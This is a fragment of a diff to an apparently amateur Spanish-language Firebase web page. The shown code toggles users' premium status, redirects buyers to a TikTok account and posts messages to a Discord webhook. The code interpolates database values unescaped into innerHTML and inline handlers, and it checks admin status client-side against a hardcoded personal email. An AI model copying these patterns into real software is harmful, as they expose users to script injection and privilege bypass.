-                const mail = child.key.replace(/_/g, '.');
-                list.innerHTML += `
-                    <div style="background:#222; margin:5px; padding:10px; border-radius:5px">
-                        <p>Correo: ${mail}</p>
-                        <button onclick="togglePrem('${child.key}', ${data.active})" style="background:${data.active?'#ff4444':'#00ff88'}; border:none; padding:5px; border-radius:3px; cursor:pointer">
-                            ${data.active ? 'PAUSAR PREMIUM' : 'REANUDAR PREMIUM'}
-                        </button>
-                    </div>
-                `;
-            });
-        });
-    }
-
-    function togglePrem(key, current) {
-        db.ref('premium/' + key + '/active').set(!current);
-    }
-
-    function comprar(pack) {
-        const msg = `quiero adquirir el paquete ${pack}`;
-        navigator.clipboard.writeText(msg);
-        alert("Mensaje copiado: " + msg);
-        window.location.href = "https://tiktok.com/@saswarsasware332";
-    }
-
-    function sendDiscord(m) {
-        fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: m }) });
-    }
-
-    function showModal(id) { document.getElementById(id).style.display = 'block'; }
-    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-</script>
-
-</body>
-</html>
-
+    // --- UI RENDERER ---
+    function updateUI() {
+        const statusEl = document.getElementById('display-status');
+        if (isGuest) statusEl.innerText = "FREE👤";
+        else if (auth.currentUser?.email === "chrisslorenzohdz@gmail.com"
